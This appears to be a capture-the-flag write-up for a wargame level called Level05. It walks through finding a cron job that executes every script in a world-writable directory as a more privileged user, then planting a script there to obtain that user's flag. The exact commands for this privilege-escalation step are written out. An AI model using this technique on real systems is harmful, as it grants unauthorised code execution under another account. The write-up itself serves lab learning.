# Level05

## Context
* No file in our home

## Resolution
 * we launch the following command: ```find / -name level05 2>/dev/null``` that ouputs :
 ```/var/mail/level05 /rofs/var/mail/level05```
 * Those two files output the same content: ```*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05```. Looks like a cron task..
 * Script ```/usr/sbin/openarenaserver``` permissions are: ```-rwxr-x---+ 1 flag05 flag05```. Its content is: 
```
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```
 * ```/opt/openarenaserver/``` folder is empty and has the following permissions : ```drwxrwxr-x+ 2 root root``` 
 * ```getfacl``` command shows:
```
user:level05:rwx
user:flag05:rwx
```
 * As we have write permissions in this folder, we decide to add ```getflag_script``` into it by lauching the following command : ```echo "getflag > /var/crash/level05_output.txt" > /opt/openarenaserver/getflag_script && chmod +x /opt/openarenaserver/getflag_script```
 * We then laucnh ```crontab -e``` and copy ```/var/mail/level05``` into our crontab
 * After less than 2 minutes, we get the flag in the ```/var/crash/level05_output.txt``` file

